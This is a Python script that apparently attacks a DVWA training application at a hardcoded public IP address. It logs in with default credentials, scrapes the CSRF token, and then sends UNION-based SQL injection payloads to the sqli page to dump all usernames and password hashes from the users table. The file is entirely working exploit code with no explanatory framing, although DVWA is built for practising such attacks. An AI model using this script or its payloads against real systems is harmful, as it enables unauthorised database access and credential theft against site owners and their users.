
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url_base = "http://31.97.117.123"
session = requests.Session()

# Login
login_url = f"{url_base}/login.php"
response = session.get(login_url, verify=False)
token_match = re.search(r"name='user_token'\s+value='([^']+)'", response.text)
user_token = token_match.group(1)

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(login_url, data=payload, verify=False, allow_redirects=True)
print("[+] Logged in successfully\n")

sqli_url = f"{url_base}/vulnerabilities/sqli/"

print("[*] DETAILED EXTRACTION OF USER DATA WITH PASSWORD HASHES\n")
print("=" * 120)

# Use GROUP_CONCAT to extract ALL data clearly
print("\n[*] Method 1: Using GROUP_CONCAT to extract ALL users at once:\n")
payload_str = "-1' UNION SELECT GROUP_CONCAT(user), GROUP_CONCAT(password) FROM users #"
response = session.get(sqli_url, params={"id": payload_str, "Submit": "Submit"}, verify=False)

pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
if pre_match:
    result_text = pre_match.group(1)
    # Parse the concatenated results
    lines = result_text.strip().split('<br />')
    for line in lines:
        print(f"    {line}")
    
    # Extract the concatenated usernames and passwords
    fname_match = re.search(r'First name: ([^<\n]+)', result_text)
    sname_match = re.search(r'Surname: ([^<\n]+)', result_text)
    
    if fname_match and sname_match:
        usernames_str = fname_match.group(1).strip()
        hashes_str = sname_match.group(1).strip()
        
        usernames = usernames_str.split(',')
        hashes = hashes_str.split(',')
        
        print("\n\n[+] PARSED DATA:")
        print("-" * 120)
        print(f"{'ID':<5} {'Username':<20} {'Password Hash':<32}")
        print("-" * 120)
        
        for i, (username, hash_val) in enumerate(zip(usernames, hashes), 1):
            print(f"{i:<5} {username.strip():<20} {hash_val.strip():<32}")
        
        print("-" * 120)

print("\n\n[*] Method 2: Extracting individual user records:\n")

all_users_detailed = []
for user_id in range(1, 6):
    # Get regular data
    response = session.get(sqli_url, params={"id": str(user_id), "Submit": "Submit"}, verify=False)
    pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
    if pre_match:
        result_text = pre_match.group(1)
        
        # Parse
        id_match = re.search(r'ID: (\d+)', result_text)
        fname_match = re.search(r'First name: ([^<\n]+)', result_text)
        sname_match = re.search(r'Surname: ([^<\n]+)', result_text)
        
        if id_match:
            user_id_val = id_match.group(1)
            first_name = fname_match.group(1).strip() if fname_match else "N/A"
            last_name = sname_match.group(1).strip() if sname_match else "N/A"
            
            # Get username and hash via UNION
            payload_str = f"{user_id}' UNION SELECT user, password FROM users #"
            response2 = session.get(sqli_url, params={"id": payload_str, "Submit": "Submit"}, verify=False)
            pre_match2 = re.search(r'<pre>(.*?)</pre>', response2.text, re.DOTALL)
            if pre_match2:
                result_text2 = pre_match2.group(1)
                fname_match2 = re.search(r'First name: ([^<\n]+)', result_text2)
                sname_match2 = re.search(r'Surname: ([^<\n]+)', result_text2)
                
                username = fname_match2.group(1).strip() if fname_match2 else "N/A"
                password_hash = sname_match2.group(1).strip() if sname_match2 else "N/A"
                
                print(f"[+] Record {user_id_val}:")
                print(f"    Username: {username}")
                print(f"    First Name: {first_name}")
                print(f"    Last Name: {last_name}")
                print(f"    Password Hash: {password_hash}")
                print()
                
                all_users_detailed.append({
                    "id": user_id_val,
                    "username": username,
                    "first_name": first_name,
                    "last_name": last_name,
                    "password_hash": password_hash
                })

print("\n" + "=" * 120)

